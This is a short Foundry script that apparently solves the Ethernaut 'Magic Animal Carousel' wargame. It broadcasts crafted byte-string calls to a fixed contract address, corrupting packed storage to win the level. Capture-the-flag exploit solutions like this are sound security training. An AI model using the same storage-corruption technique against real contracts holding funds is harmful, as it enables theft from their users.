// SPDX-License-Identifier: MIT

pragma solidity 0.8.26;

import "forge-std/Script.sol";
import "./../../test/ethernaut/carousel/Carousel.sol";

contract CarouselScript is Script {
    function run() public {
        uint256 pk = vm.envUint("PK");

        vm.startBroadcast(pk);
        MagicAnimalCarousel carousel = MagicAnimalCarousel(0x5A64A4aC5E1c2050be8ACdB6D91d19389Ca5362E);
        carousel.changeAnimal(string(abi.encodePacked(hex"00000000000000000000ffff")), 0);
        carousel.setAnimalAndSpin("dog"); //set max as 0 ^ dog
        carousel.changeAnimal(string(abi.encodePacked(hex"11110000000000000000ffff")), 0xffff);
        vm.stopBroadcast();
    }
}
